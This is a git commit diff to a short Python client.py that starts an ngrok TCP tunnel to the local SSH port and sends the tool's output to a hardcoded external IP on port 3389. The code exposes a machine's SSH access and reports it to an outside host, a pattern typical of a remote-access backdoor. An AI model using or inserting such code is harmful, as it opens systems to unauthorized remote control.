55a9b7e3a3dc56f5303ee995c1f253a74c01a4fb
AcevedoC17 <77506847+AcevedoC17@users.noreply.github.com>
2022-02-26 11:44:57 -0400

    Fixed client.py

--- src/client.py
+++ src/client.py
@@ -1,10 +1,12 @@
 import socket
 import subprocess
-output = subprocess.check_output(["ngrok", "tcp", "22"], shell=True)
+#output = subprocess.check_output(['echo', 'Hello'], shell=True)
+output = subprocess.run(['ngrok', 'tcp', '22'], check = False , capture_output = True, shell=True).stdout
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = 3389
 print("Trying to connect...")
 s.connect(('34.95.19.212', port))
 print (s.recv(1024).decode())
+print(output)
 s.sendall(output)
 s.close()
